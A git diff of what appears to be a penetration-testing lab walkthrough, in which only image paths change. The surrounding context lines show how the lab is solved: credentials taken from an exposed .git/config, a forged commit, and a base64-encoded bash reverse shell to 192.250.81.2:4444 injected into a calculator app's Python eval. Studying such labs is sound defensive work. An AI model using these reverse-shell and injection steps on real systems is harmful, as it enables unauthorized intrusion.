@@ -27,7 +27,7 @@ The best tools for this lab are:
 
 Pinging the website [http://online-calc.com/](http://online-calc.com) gives us an IP of 192.9.232.3
 
-![](<../../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../../.gitbook/assets/image (11) (1) (1).png>)
 
 We'll run an nmap scan against the target
 
@@ -41,7 +41,7 @@ There is an Apache 2.4.29 HTTP server running on Port 80
 
 Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed
 
-![](<../../../../.gitbook/assets/image (7) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
 Looks like there's another web server running something called Werkzeug (version 1.0.1) built with Python 2.7.17
 
@@ -71,7 +71,7 @@ There's an error message when visiting port 8000
 
 One thing that stood out in the nmap scan was this file path
 
-![](<../../../../.gitbook/assets/image (43) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (43) (1) (1) (1) (1).png>)
 
 When you visit /.git itself, you receive an error
 
@@ -83,7 +83,7 @@ However, visiting .git/config gives you a file to download
 
 And its file content is interesting
 
-![](<../../../../.gitbook/assets/image (40) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (40) (1) (1) (1) (1) (1).png>)
 
 We'll keep these credentials saved just in case they come in handy
 
@@ -99,7 +99,7 @@ Nothing interesting on port 5000 either
 
 Now we have something interesting!
 
-![](<../../../../.gitbook/assets/image (41) (1) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (41) (1) (1) (1) (1) (1).png>)
 
 We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN
 
@@ -109,7 +109,7 @@ It doesn't allow unauthenticated access and so far we haven't found a PIN number
 
 Thinking about the credentials we do have and the direction we're trying to go, let's take another look at that config file
 
-![](<../../../../.gitbook/assets/image (24) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (24) (1) (1) (1).png>)
 
 Is there any chance we could get access to that? Can we clone the repository using Git?
 
@@ -169,7 +169,7 @@ git add .
 git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
 ```
 
-![](<../../../../.gitbook/assets/image (51) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (51) (1) (1) (1) (1).png>)
 
 Git Status
 
@@ -199,7 +199,7 @@ Now we'll prepare our exploit to get a reverse shell on the target machine
 
 It should also be noted the `/` characters in the user payload would be converted to `* 1.0 /` by the `evaluate` function, so we'll use base64 to encode the payload
 
-![](<../../../../.gitbook/assets/image (23) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (23) (1) (1) (1).png>)
 
 ```bash
 echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
@@ -210,7 +210,7 @@ YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
 
 Start a netcat listener
 
-![](<../../../../.gitbook/assets/image (42) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (42) (1) (1) (1) (1).png>)
 
 Here's the payload we'll use:
 
@@ -224,7 +224,7 @@ Since our payload will be executed by the`eval`function in Python, we have to im
 
 Now we'll paste the payload in the textbox of the calculator webapp and press the`=`button to execute the payload to the backend\\
 
-![](<../../../../.gitbook/assets/image (50) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (50) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (19) (1) (1) (1).png>)
 
